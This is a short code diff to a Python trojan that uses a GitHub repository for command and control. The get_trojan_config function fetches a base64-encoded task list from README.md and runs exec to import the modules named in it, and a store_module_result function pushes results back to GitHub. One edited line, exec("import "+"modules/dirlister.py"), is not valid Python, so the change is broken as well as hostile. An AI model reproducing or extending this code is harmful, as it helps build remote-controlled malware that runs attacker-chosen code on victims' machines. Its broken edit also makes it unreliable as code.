@@ -60,6 +60,7 @@ def get_trojan_config():
     
     config_json = get_file_contents("README.md");
     
+    config_json = base64.b64decode(config_json);
     print(config_json);
 
     config = json.loads(config_json);
@@ -68,9 +69,9 @@ def get_trojan_config():
 
     for task in config:
         if task['module'] not in sys.modules:
-            exec("import "+task['module'])
+            exec("import "+"modules/dirlister.py")
 
-    return base64.b64decode(config)
+    return config
 
 def store_module_result(data) :
     gh,repo,branch = connect_to_github()
